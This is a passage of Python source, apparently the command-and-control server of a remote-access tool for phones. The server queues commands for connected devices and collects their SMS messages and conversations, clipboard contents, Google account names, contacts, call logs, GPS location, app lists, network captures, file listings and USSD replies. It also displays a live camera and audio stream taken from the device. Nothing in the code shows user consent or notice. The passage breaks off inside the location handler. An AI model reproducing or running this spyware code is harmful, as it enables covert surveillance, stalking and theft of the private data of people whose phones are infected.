from flask import Flask, request, jsonify, Response
from datetime import datetime
import threading
import time
import sys
import os
import signal
import json
import logging
import socket
import select
import base64
from PIL import Image
import io
import subprocess
import requests
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import pygame
import numpy as np
import threading
import queue
import multiprocessing as mp
import platform
import pyaudio
import ssl
import asyncio
import websockets
from queue import Queue, Empty
from collections import deque

# New LiveStreamGUI implementation
class LiveStreamGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Live Stream Viewer")
        self.root.geometry("800x600")
        self.root.configure(bg='black')

        # Initialize audio_enabled as an instance variable
        self.audio_enabled = False

        # Status label
        self.status_label = tk.Label(
            self.root,
            text="Waiting for connection...",
            fg='white',
            bg='black',
            font=('Arial', 12)
        )
        self.status_label.pack(pady=10)

        # Camera control frame
        self.camera_frame = tk.Frame(self.root, bg='black')
        self.camera_frame.pack(pady=5)

        self.btn_front_camera = tk.Button(
            self.camera_frame,
            text="Front Camera",
            command=self.switch_to_front_camera,
            state=tk.DISABLED,
            bg='gray20',
            fg='white',
            activebackground='gray40',
            activeforeground='white'
        )
        self.btn_front_camera.pack(side=tk.LEFT, padx=5)

        self.btn_back_camera = tk.Button(
            self.camera_frame,
            text="Back Camera",
            command=self.switch_to_back_camera,
            state=tk.DISABLED,
            bg='gray20',
            fg='white',
            activebackground='gray40',
            activeforeground='white'
        )
        self.btn_back_camera.pack(side=tk.LEFT, padx=5)

        # Image display
        self.image_label = tk.Label(self.root, bg='black')
        self.image_label.pack(expand=True, fill='both', padx=10, pady=10)

        # Stats frame
        self.stats_frame = tk.Frame(self.root, bg='black')
        self.stats_frame.pack(pady=5)

        self.video_status = tk.Label(
            self.stats_frame,
            text="Video: Disconnected",
            fg='red',
            bg='black',
            font=('Arial', 10)
        )
        self.video_status.pack(side=tk.LEFT, padx=10)

        self.audio_status = tk.Label(
            self.stats_frame,
            text="Audio: Disabled",
            fg='orange',
            bg='black',
            font=('Arial', 10)
        )
        self.audio_status.pack(side=tk.LEFT, padx=10)

        self.fps_label = tk.Label(
            self.stats_frame,
            text="FPS: 0",
            fg='white',
            bg='black',
            font=('Arial', 10)
        )
        self.fps_label.pack(side=tk.LEFT, padx=10)

        # Connection info
        self.info_label = tk.Label(
            self.root,
            text="Server running on: ws://localhost:5001",
            fg='gray',
            bg='black',
            font=('Arial', 8)
        )
        self.info_label.pack(side=tk.BOTTOM, pady=5)

        # Initialize audio
        self.initialize_audio()

        # Start audio playback thread if audio is enabled
        if self.audio_enabled:
            self.start_audio_thread()

        # Initialize connection stats and camera info as instance variables
        self.connection_stats = {
            'video_frames': 0,
            'audio_chunks': 0,
            'start_time': time.time(),
            'last_video_time': 0,
            'last_audio_time': 0
        }

        self.camera_info = {
            'frontCamera': False,
            'backCamera': False,
            'currentCamera': 'unknown'
        }

        # WebSocket connection
        self.websocket_connection = None
        self.websocket_loop = None

        # Video buffer
        self.video_buffer = deque(maxlen=2)

        # Update display periodically
        self.update_display()

    def initialize_audio(self):
        """Initialize audio system with error handling"""
        self.audio_enabled = False
        self.audio = None
        self.audio_stream = None

        try:
            self.audio = pyaudio.PyAudio()
            device_info = self.audio.get_default_output_device_info()
            print(f"Using audio device: {device_info['name']}")
            self.audio_enabled = True
        except Exception as e:
            print(f"Audio initialization failed: {e}")
            print("Audio will be disabled")

    def start_audio_thread(self):
        """Start audio playback in separate thread"""
        if not self.audio_enabled:
            return

        def audio_worker():
            try:
                self.audio_stream = self.audio.open(
                    format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    output=True,
                    frames_per_buffer=1024
                )

                while True:
                    try:
                        audio_data = self.audio_queue.get(timeout=0.1)
                        if self.audio_stream and self.audio_stream.is_active():
                            self.audio_stream.write(audio_data)
                            self.connection_stats['audio_chunks'] += 1
                            self.connection_stats['last_audio_time'] = time.time()
                    except Empty:
                        continue
                    except Exception as e:
                        print(f"Audio playback error: {e}")
                        break

            except Exception as e:
                print(f"Audio setup error: {e}")

        self.audio_queue = Queue(maxsize=10)
        audio_thread = threading.Thread(target=audio_worker, daemon=True)
        audio_thread.start()

    def update_display(self):
        """Update the image display and stats"""
        # Update FPS
        elapsed = time.time() - self.connection_stats['start_time']
        if elapsed > 0:
            fps = self.connection_stats['video_frames'] / elapsed
            self.fps_label.config(text=f"FPS: {fps:.1f}")

        # Check connection status
        current_time = time.time()
        if current_time - self.connection_stats['last_video_time'] > 2:
            self.video_status.config(text="Video: Disconnected", fg='red')
        else:
            self.video_status.config(text="Video: Connected", fg='green')

        if self.audio_enabled:
            if current_time - self.connection_stats['last_audio_time'] > 2:
                self.audio_status.config(text="Audio: Disconnected", fg='red')
            else:
                self.audio_status.config(text="Audio: Connected", fg='green')

        # Update camera buttons
        self.btn_front_camera.config(
            state=tk.NORMAL if self.camera_info['frontCamera'] else tk.DISABLED)
        self.btn_back_camera.config(
            state=tk.NORMAL if self.camera_info['backCamera'] else tk.DISABLED)

        # Highlight current camera
        if self.camera_info['currentCamera'] == 'front':
            self.btn_front_camera.config(bg='darkgreen')
            self.btn_back_camera.config(bg='gray20')
        elif self.camera_info['currentCamera'] == 'back':
            self.btn_front_camera.config(bg='gray20')
            self.btn_back_camera.config(bg='darkgreen')

        # Process video buffer
        if self.video_buffer:
            try:
                frame_data = self.video_buffer.pop()
                pil_image = Image.open(io.BytesIO(frame_data))

                display_width = 640
                display_height = 480
                pil_image = pil_image.resize(
                    (display_width, display_height), Image.Resampling.LANCZOS)

                photo = ImageTk.PhotoImage(pil_image)
                self.image_label.configure(image=photo)
                self.image_label.image = photo

                self.connection_stats['video_frames'] += 1
                self.connection_stats['last_video_time'] = time.time()

            except Exception as e:
                print(f"Image display error: {e}")

        self.root.after(16, self.update_display)

    def update_connection_status(self, message):
        """Update connection status message"""
        self.status_label.configure(text=message)

    def switch_to_front_camera(self):
        """Send command to switch to front camera"""
        self.send_camera_command("front")

    def switch_to_back_camera(self):
        """Send command to switch to back camera"""
        self.send_camera_command("back")

    def send_camera_command(self, camera_type):
        """Send camera switch command with proper async handling"""
        if self.websocket_connection and self.websocket_loop:
            try:
                command = {
                    "command": "switch_camera",
                    "camera": camera_type
                }

                # Schedule the coroutine on the correct event loop
                asyncio.run_coroutine_threadsafe(
                    self.websocket_connection.send(json.dumps(command)),
                    self.websocket_loop
                )

                print(f"✓ Sent camera switch command: {camera_type}")

            except Exception as e:
                print(f"✗ Error sending camera command: {e}")
        else:
            print("✗ No active WebSocket connection")

    def run(self):
        """Start the GUI main loop"""
        self.root.mainloop()

        # Cleanup
        if self.audio_stream:
            self.audio_stream.stop_stream()
            self.audio_stream.close()
        if self.audio:
            self.audio.terminate()

# Global variable for the stream GUI instance
stream_gui = None

async def handle_stream(websocket):
    """Handle WebSocket connections with proper loop storage"""
    print(f"✓ New connection from {websocket.remote_address}")

    # Create a global instance of LiveStreamGUI if it doesn't exist
    global stream_gui
    if stream_gui is None:
        stream_gui = LiveStreamGUI()
        # Start the GUI in a separate thread
        gui_thread = threading.Thread(target=stream_gui.run)
        gui_thread.daemon = True
        gui_thread.start()

    stream_gui.websocket_connection = websocket
    stream_gui.websocket_loop = asyncio.get_event_loop()  # Store the event loop

    try:
        async for message in websocket:
            if isinstance(message, bytes):
                if len(message) > 0:
                    msg_type = message[0]
                    data = message[1:]

                    if msg_type == 0x01:  # Video frame
                        stream_gui.video_buffer.append(data)

                    elif msg_type == 0x02:  # Audio data
                        if stream_gui.audio_enabled:
                            try:
                                stream_gui.audio_queue.put_nowait(data)
                            except:
                                try:
                                    stream_gui.audio_queue.get_nowait()
                                    stream_gui.audio_queue.put_nowait(data)
                                except:
                                    pass

            elif isinstance(message, str):
                try:
                    data = json.loads(message)
                    if data.get("type") == "camera_info":
                        stream_gui.camera_info['frontCamera'] = data.get(
                            "frontCamera", False)
                        stream_gui.camera_info['backCamera'] = data.get(
                            "backCamera", False)
                        stream_gui.camera_info['currentCamera'] = data.get(
                            "currentCamera", "unknown")
                        print(f"✓ Camera info: Front={stream_gui.camera_info['frontCamera']}, "
                              f"Back={stream_gui.camera_info['backCamera']}, "
                              f"Current={stream_gui.camera_info['currentCamera']}")
                except Exception as e:
                    print(f"✗ Error parsing JSON: {e}")

            # Acknowledgment
            await websocket.send(json.dumps({"status": "ok"}))

    except websockets.exceptions.ConnectionClosed:
        print(f"✗ Connection closed: {websocket.remote_address}")
    except Exception as e:
        print(f"✗ Error handling connection: {e}")
    finally:
        print(f"Connection ended: {websocket.remote_address}")
        stream_gui.websocket_connection = None
        stream_gui.websocket_loop = None

def start_websocket_server():
    """Start the WebSocket server"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def serve():
        server = await websockets.serve(
            handle_stream,
            "0.0.0.0",
            5001,  # Changed to port 5001 to avoid conflict with Flask
            ping_interval=20,
            ping_timeout=10,
            max_queue=1024
        )
        print("✓ WebSocket server started on ws://0.0.0.0:5001")
        return server

    server = loop.run_until_complete(serve())
    loop.run_forever()

class DeviceMonitorServer:
    def __init__(self, host='0.0.0.0', port=5000):
        self.host = host
        self.port = port
        self.app = Flask(__name__)

        @self.app.after_request
        def after_request(response):
            response.headers.add('Access-Control-Allow-Origin', '*')
            response.headers.add(
                'Access-Control-Allow-Headers', 'Content-Type,Authorization')
            response.headers.add(
                'Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
            response.headers.add('Access-Control-Allow-Credentials', 'true')
            return response

        @self.app.before_request
        def handle_preflight():
            if request.method == "OPTIONS":
                response = jsonify()
                response.headers.add("Access-Control-Allow-Origin", "*")
                response.headers.add(
                    'Access-Control-Allow-Headers', "Content-Type,Authorization")
                response.headers.add(
                    'Access-Control-Allow-Methods', "GET,PUT,POST,DELETE,OPTIONS")
                return response

        self.connected_devices = {}
        self.device_data = {}
        self.running = False
        self.display_thread = None
        self.input_thread = None
        self.last_heartbeat = {}
        self.device_commands = {}
        self.mode = "command"
        self.clipboard_history = {}
        self.sms_history = {}
        self.ussd_responses = {}
        self.sms_listening_active = False
        self.sms_listening_thread = None
        self.app_lists = {}
        self.sms_conversations = {}
        self.sms_threads = {}
        self.waiting_for_sms_conversation = False
        self.sms_conversation_sender = ""
        self.sms_conversation_timeout = 0
        self.network_sniff_results = {}
        self.network_devices = {}
        # Add these to the DeviceMonitorServer class __init__ method
        self.contacts_history = {}
        self.call_logs_history = {}
        self.location_history = {}
        self.camera_history = {}
        self.audio_history = {}
        self.accounts_history = {}  # Added missing accounts_history

        # File system state
        self.current_directory = {}  # device_id -> current directory path
        self.selected_device_id = None  # Currently selected device for file operations

        # Stream viewer
        self.stream_process = None

        self.disable_flask_logging()
        self.setup_routes()

    def disable_flask_logging(self):
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.WARNING)
        self.app.logger.setLevel(logging.WARNING)

    def get_local_ip(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"

    def get_prompt_string(self):
        """Get the command prompt string with current directory"""
        if self.selected_device_id and self.selected_device_id in self.current_directory:
            current_dir = self.current_directory[self.selected_device_id]
            return f"[{current_dir}]> "
        else:
            return "[no device selected]> "

    def setup_routes(self):
        @self.app.route('/', methods=['GET'])
        def home():
            return jsonify({
                'message': 'Device Monitor Server is running',
                'status': 'online',
                'timestamp': datetime.now().isoformat(),
                'connected_devices': len(self.connected_devices)
            })

        @self.app.route('/ping', methods=['GET', 'POST'])
        def ping():
            return jsonify({
                'status': 'pong',
                'timestamp': datetime.now().isoformat(),
                'server_time': time.time()
            })

        @self.app.route('/status', methods=['GET'])
        def status():
            return jsonify({
                'status': 'running',
                'connected_devices': len(self.connected_devices),
                'timestamp': datetime.now().isoformat(),
                'server_uptime': time.time(),
                'devices': list(self.connected_devices.keys())
            })

        @self.app.route('/connect', methods=['POST'])
        def connect_device():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                device_info = data.get('device_info', {})

                self.connected_devices[device_id] = {
                    'connected_at': datetime.now(),
                    'last_seen': datetime.now(),
                    'info': device_info,
                    'ip': request.remote_addr
                }

                self.last_heartbeat[device_id] = time.time()

                if device_id not in self.device_data:
                    self.device_data[device_id] = {
                        'last_update': time.time(),
                        'data': {}
                    }

                if device_id not in self.device_commands:
                    self.device_commands[device_id] = []

                if device_id not in self.clipboard_history:
                    self.clipboard_history[device_id] = []

                if device_id not in self.sms_history:
                    self.sms_history[device_id] = []

                if device_id not in self.ussd_responses:
                    self.ussd_responses[device_id] = []

                if device_id not in self.app_lists:
                    self.app_lists[device_id] = []

                if device_id not in self.sms_conversations:
                    self.sms_conversations[device_id] = {}

                if device_id not in self.sms_threads:
                    self.sms_threads[device_id] = []

                if device_id not in self.network_sniff_results:
                    self.network_sniff_results[device_id] = []

                if device_id not in self.network_devices:
                    self.network_devices[device_id] = []

                # Add these to the connect_device method
                if device_id not in self.contacts_history:
                    self.contacts_history[device_id] = []

                if device_id not in self.call_logs_history:
                    self.call_logs_history[device_id] = []

                if device_id not in self.location_history:
                    self.location_history[device_id] = []

                if device_id not in self.camera_history:
                    self.camera_history[device_id] = []

                if device_id not in self.audio_history:
                    self.audio_history[device_id] = []
                    
                if device_id not in self.accounts_history:
                    self.accounts_history[device_id] = []

                # Initialize file system state
                if device_id not in self.current_directory:
                    # Get initial directory from device info if available
                    initial_dir = device_info.get('current_directory', '/')
                    self.current_directory[device_id] = initial_dir

                return jsonify({
                    'status': 'connected',
                    'device_id': device_id,
                    'server_time': time.time(),
                    'message': 'Device connected successfully'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': f'Connection failed: {str(e)}'
                }), 500

        @self.app.route('/heartbeat', methods=['POST'])
        def heartbeat():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)

                if device_id in self.connected_devices:
                    self.connected_devices[device_id]['last_seen'] = datetime.now()
                    self.last_heartbeat[device_id] = time.time()

                return jsonify({
                    'status': 'alive',
                    'server_time': time.time()
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/commands', methods=['GET'])
        def get_commands():
            try:
                device_id = request.args.get('device_id', request.remote_addr)

                if device_id not in self.device_commands:
                    self.device_commands[device_id] = []

                commands = self.device_commands[device_id].copy()
                self.device_commands[device_id].clear()

                return jsonify({
                    'status': 'success',
                    'commands': commands,
                    'timestamp': time.time()
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/send_command', methods=['POST'])
        def send_command():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id')
                command = data.get('command')
                params = data.get('params', {})

                if not device_id or not command:
                    return jsonify({
                        'status': 'error',
                        'message': 'device_id and command are required'
                    }), 400

                if device_id not in self.connected_devices:
                    return jsonify({
                        'status': 'error',
                        'message': 'Device not connected'
                    }), 404

                if device_id not in self.device_commands:
                    self.device_commands[device_id] = []

                command_data = {
                    'command': command,
                    'timestamp': time.time(),
                    'id': f"cmd_{int(time.time() * 1000)}"
                }

                if params:
                    command_data['params'] = params

                self.device_commands[device_id].append(command_data)

                return jsonify({
                    'status': 'success',
                    'message': f'Command "{command}" sent to device {device_id}'
                })

            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/fs_response', methods=['POST'])
        def fs_response():
            """Handle file system command responses from devices"""
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                command = data.get('command', '')
                success = data.get('success', False)
                path = data.get('path', '')
                error = data.get('error', None)

                if device_id not in self.current_directory:
                    self.current_directory[device_id] = '/'

                if command == 'pwd' and success:
                    self.current_directory[device_id] = path
                    print(f"\n📁 Current directory on {device_id}: {path}")
                elif command == 'cd' and success:
                    self.current_directory[device_id] = path
                    print(f"\n📁 Changed directory on {device_id} to: {path}")
                elif command == 'search' and success:
                    results = data.get('results', [])
                    print(f"\n🔍 Search results on {device_id} in {self.current_directory[device_id]}:")
                    for result in results:
                        print(f"   - {result}")
                elif command == 'mkdir' and success:
                    print(f"\n📁 Directory created on {device_id}: {path}")
                elif command == 'ls' and success:
                    items = data.get('items', [])
                    print(f"\n📁 Directory listing for {device_id} in {path}:")
                    for item in items:
                        item_type = "📁" if item.get('is_directory', False) else "📄"
                        size = item.get('size', 0)
                        size_str = f"{size} bytes" if size > 0 else "directory"
                        print(f"   {item_type} {item.get('name', 'Unknown')} - {size_str}")
                elif command == 'upload_file' and success:
                    file_path = data.get('file_path', '')
                    print(f"\n📁 File uploaded from {device_id}: {file_path}")
                elif command == 'download_file' and success:
                    file_path = data.get('file_path', '')
                    print(f"\n📁 File downloaded to {device_id}: {file_path}")
                elif not success:
                    print(f"\n❌ File system command failed on {device_id}: {error}")

                # If this is the selected device, update the prompt
                if device_id == self.selected_device_id:
                    self.show_prompt()

                return jsonify({
                    'status': 'success',
                    'message': 'File system response received'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/clipboard', methods=['POST'])
        def receive_clipboard():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                clipboard_data = data.get('clipboard', '')
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.clipboard_history:
                    self.clipboard_history[device_id] = []

                self.clipboard_history[device_id].append({
                    'data': clipboard_data,
                    'timestamp': timestamp,
                    'time_str': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                })

                if len(self.clipboard_history[device_id]) > 100:
                    self.clipboard_history[device_id] = self.clipboard_history[device_id][-100:]

                return jsonify({
                    'status': 'success',
                    'message': 'Clipboard data received'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/clipboard_history', methods=['GET'])
        def get_clipboard_history():
            try:
                device_id = request.args.get('device_id', request.remote_addr)

                if device_id not in self.clipboard_history:
                    return jsonify({
                        'status': 'error',
                        'message': 'No clipboard history for this device'
                    }), 404

                return jsonify({
                    'status': 'success',
                    'clipboard_history': self.clipboard_history[device_id]
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/accounts', methods=['POST'])
        def receive_accounts():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                accounts = data.get('accounts', [])
                success = data.get('success', False)
                error = data.get('error', None)
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.accounts_history:
                    self.accounts_history[device_id] = []

                if success:
                    self.accounts_history[device_id] = accounts
                    print(f"\n📱 GOOGLE ACCOUNTS RECEIVED:")
                    print(f"   From device: {device_id}")
                    print(f"   Total accounts: {len(accounts)}")
                    for account in accounts:
                        print(f"   - {account}")
                    print("💡 Accounts data stored successfully")
                else:
                    print(f"\n❌ Error retrieving accounts from {device_id}: {error}")

                return jsonify({
                    'status': 'success',
                    'message': 'Accounts data received'
                })
            except Exception as e:
                print(f"❌ Error receiving accounts: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/sms', methods=['POST'])
        def receive_sms():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                sender = data.get('sender', '')
                message = data.get('message', '')
                timestamp = data.get('timestamp', time.time())
                time_str = data.get('time_str', '')
                msg_type = data.get('type', 'incoming')

                if device_id not in self.sms_history:
                    self.sms_history[device_id] = []

                self.sms_history[device_id].append({
                    'sender': sender,
                    'message': message,
                    'timestamp': timestamp,
                    'time_str': time_str,
                    'type': msg_type
                })

                if len(self.sms_history[device_id]) > 100:
                    self.sms_history[device_id] = self.sms_history[device_id][-100:]

                if self.sms_listening_active:
                    print(f"\n📱 NEW SMS RECEIVED:")
                    print(f"   Type: {msg_type.upper()}")
                    print(f"   From: {sender}")
                    print(f"   Message: {message}")
                    print(f"   Time: {time_str}")
                    print("💡 Press 'z' to stop listening for SMS messages")

                return jsonify({
                    'status': 'success',
                    'message': 'SMS data received'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/sms_threads', methods=['POST'])
        def receive_sms_threads():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                threads = data.get('threads', [])
                timestamp = data.get('timestamp', time.time())

                # Convert timestamp from milliseconds to seconds if necessary
                if isinstance(timestamp, (int, float)) and timestamp > 1e12:
                    timestamp = timestamp / 1000.0

                if device_id not in self.sms_threads:
                    self.sms_threads[device_id] = []

                self.sms_threads[device_id] = threads

                print(f"\n📱 SMS THREADS RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Total threads: {len(threads)}")
                print("💡 Threads data stored successfully")

                return jsonify({
                    'status': 'success',
                    'message': 'SMS threads received'
                })
            except Exception as e:
                print(f"❌ Error receiving SMS threads: {str(e)}")
                import traceback
                traceback.print_exc()
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/sms_conversation', methods=['POST'])
        def receive_sms_conversation():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                sender = data.get('sender', '')
                conversation = data.get('conversation', [])
                timestamp = data.get('timestamp', time.time())

                # Convert timestamp from milliseconds to seconds if necessary
                if isinstance(timestamp, (int, float)) and timestamp > 1e12:
                    timestamp = timestamp / 1000.0

                if device_id not in self.sms_conversations:
                    self.sms_conversations[device_id] = {}

                self.sms_conversations[device_id][sender] = {
                    'conversation': conversation,
                    'timestamp': timestamp,
                    'time_str': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                }

                # Always print a summary of the received conversation
                print(f"\n📱 SMS CONVERSATION RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Sender: {sender}")
                print(f"   Total messages: {len(conversation)}")
                print(f"   Time: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
                print("💡 Conversation data stored successfully")
                print("💡 Type 'show_conversation <sender>' to display the full conversation")

                # If we are waiting for this conversation, display it in full
                if self.waiting_for_sms_conversation and sender.lower() == self.sms_conversation_sender.lower():
                    self.display_sms_conversation(sender, conversation)
                    self.waiting_for_sms_conversation = False
                    self.sms_conversation_sender = ""

                return jsonify({
                    'status': 'success',
                    'message': 'SMS conversation received'
                })
            except Exception as e:
                print(f"❌ Error receiving SMS conversation: {str(e)}")
                import traceback
                traceback.print_exc()
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/ussd_status', methods=['POST'])
        def receive_ussd_status():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                ussd_code = data.get('ussd_code', '')
                status = data.get('status', '')
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.ussd_responses:
                    self.ussd_responses[device_id] = []

                self.ussd_responses[device_id].append({
                    'ussd_code': ussd_code,
                    'status': status,
                    'timestamp': timestamp,
                    'response': ''
                })

                if status == "waiting":
                    print(f"\n📱 USSD CODE SENT: {ussd_code}")
                    print("⏳ Waiting for response...")

                return jsonify({
                    'status': 'success',
                    'message': 'USSD status received'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/ussd_response', methods=['POST'])
        def receive_ussd_response():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                ussd_code = data.get('ussd_code', '')
                response = data.get('response', '')
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.ussd_responses:
                    self.ussd_responses[device_id] = []

                if self.ussd_responses[device_id]:
                    last_entry = self.ussd_responses[device_id][-1]
                    if last_entry['ussd_code'] == ussd_code and last_entry['status'] == 'waiting':
                        last_entry['response'] = response
                        last_entry['timestamp'] = timestamp
                    else:
                        self.ussd_responses[device_id].append({
                            'ussd_code': ussd_code,
                            'status': 'completed',
                            'response': response,
                            'timestamp': timestamp
                        })
                else:
                    self.ussd_responses[device_id].append({
                        'ussd_code': ussd_code,
                        'status': 'completed',
                        'response': response,
                        'timestamp': timestamp
                    })

                print(f"\n📱 USSD RESPONSE RECEIVED:")
                print(f"   Code: {ussd_code}")
                print(f"   Response: {response}")
                print("💡 Press any key to continue")

                return jsonify({
                    'status': 'success',
                    'message': 'USSD response received'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/app_list', methods=['POST'])
        def receive_app_list():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                app_list = data.get('app_list', [])
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.app_lists:
                    self.app_lists[device_id] = []

                self.app_lists[device_id] = app_list

                return jsonify({
                    'status': 'success',
                    'message': 'App list received'
                })
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/pcap', methods=['POST'])
        def receive_pcap():
            try:
                if 'pcap_file' not in request.files:
                    return jsonify({'status': 'error', 'message': 'No pcap file provided'}), 400

                pcap_file = request.files['pcap_file']
                device_id = request.form.get('device_id', request.remote_addr)

                timestamp_str = request.form.get('timestamp', None)
                if timestamp_str:
                    try:
                        timestamp = float(timestamp_str)
                        if timestamp > 10000000000:
                            timestamp = timestamp / 1000.0
                        year = datetime.fromtimestamp(timestamp).year
                        if year < 2000 or year > 2100:
                            timestamp = time.time()
                    except ValueError:
                        timestamp = time.time()
                else:
                    timestamp = time.time()

                if pcap_file:
                    if not os.path.exists('pcaps'):
                        os.makedirs('pcaps')

                    filename = f"{device_id}_{int(timestamp)}.pcap"
                    pcap_file.save(os.path.join('pcaps', filename))

                    if device_id not in self.network_sniff_results:
                        self.network_sniff_results[device_id] = []

                    self.network_sniff_results[device_id].append({
                        'filename': filename,
                        'timestamp': timestamp,
                        'time_str': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    })

                    print(f"\n🔍 PCAP FILE RECEIVED:")
                    print(f"   Device: {device_id}")
                    print(f"   Filename: {filename}")
                    print(f"   Time: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}")
                    print("💡 PCAP file saved successfully")

                    return jsonify({'status': 'success', 'message': 'Pcap file received'})
                else:
                    return jsonify({'status': 'error', 'message': 'No pcap file provided'}), 400
            except Exception as e:
                print(f"❌ Error receiving PCAP file: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        @self.app.route('/devices', methods=['POST'])
        def receive_devices():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                devices = data.get('devices', [])
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.network_devices:
                    self.network_devices[device_id] = []

                self.network_devices[device_id] = devices

                print(f"\n🔍 NETWORK DEVICES RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Total devices: {len(devices)}")

                for i, device in enumerate(devices):
                    print(f"   Device {i+1}: {device.get('ip', 'N/A')} - {device.get('hostname', 'N/A')} ({device.get('status', 'N/A')})")

                return jsonify({'status': 'success', 'message': 'Devices data received'})
            except Exception as e:
                print(f"❌ Error receiving devices data: {str(e)}")
                return jsonify({'status': 'error', 'message': str(e)}), 500

        # Add these new endpoints here
        @self.app.route('/contacts', methods=['POST'])
        def receive_contacts():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                contacts = data.get('contacts', [])
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.contacts_history:
                    self.contacts_history[device_id] = []

                self.contacts_history[device_id] = contacts

                print(f"\n📱 CONTACTS RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Total contacts: {len(contacts)}")
                print("💡 Contacts data stored successfully")

                return jsonify({
                    'status': 'success',
                    'message': 'Contacts received'
                })
            except Exception as e:
                print(f"❌ Error receiving contacts: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/call_logs', methods=['POST'])
        def receive_call_logs():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                call_logs = data.get('call_logs', [])
                timestamp = data.get('timestamp', time.time())

                if device_id not in self.call_logs_history:
                    self.call_logs_history[device_id] = []

                self.call_logs_history[device_id] = call_logs

                print(f"\n📞 CALL LOGS RECEIVED:")
                print(f"   From device: {device_id}")
                print(f"   Total call logs: {len(call_logs)}")
                print("💡 Call logs data stored successfully")

                return jsonify({
                    'status': 'success',
                    'message': 'Call logs received'
                })
            except Exception as e:
                print(f"❌ Error receiving call logs: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500

        @self.app.route('/location', methods=['POST'])
        def receive_location():
            try:
                data = request.get_json() or {}
                device_id = data.get('device_id', request.remote_addr)
                latitude = data.get('latitude')
                longitude = data.get('longitude')
                accuracy = data.get('accuracy')
                altitude = data.get('altitude')
                speed = data.get('speed')
                bearing = data.get('bearing')
                timestamp = data.get('timestamp', time.time())
                error = data.get('error')

                # Fix: Convert timestamp from milliseconds to seconds if necessary
                if isinstance(timestamp, (int, float)) and timestamp > 1e12:
                    timestamp = timestamp / 1000.0

                # Rest of the method remains the same...

                if device_id not in self.location_history:
                    self.location_history[device_id] = []

                location_data = {
                    'timestamp': timestamp,
                    'time_str': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                }

                if error:
                    location_data['error'] = error
                else:
                    location_data.update({
                        'latitude': latitude,
                        'longitude': longitude,
                        'accuracy': accuracy,
                        'altitude': altitude,
                        'speed': speed,
                        'bearing': bearing
                    })

                self.location_history[device_id].append(location_data)

                print(f"\n📍 LOCATION RECEIVED:")
                print(f"   From device: {device_id}")
                if error:
                    print(f"   Error: {error}")
                else:
                    print(f"   Latitude: {latitude}")
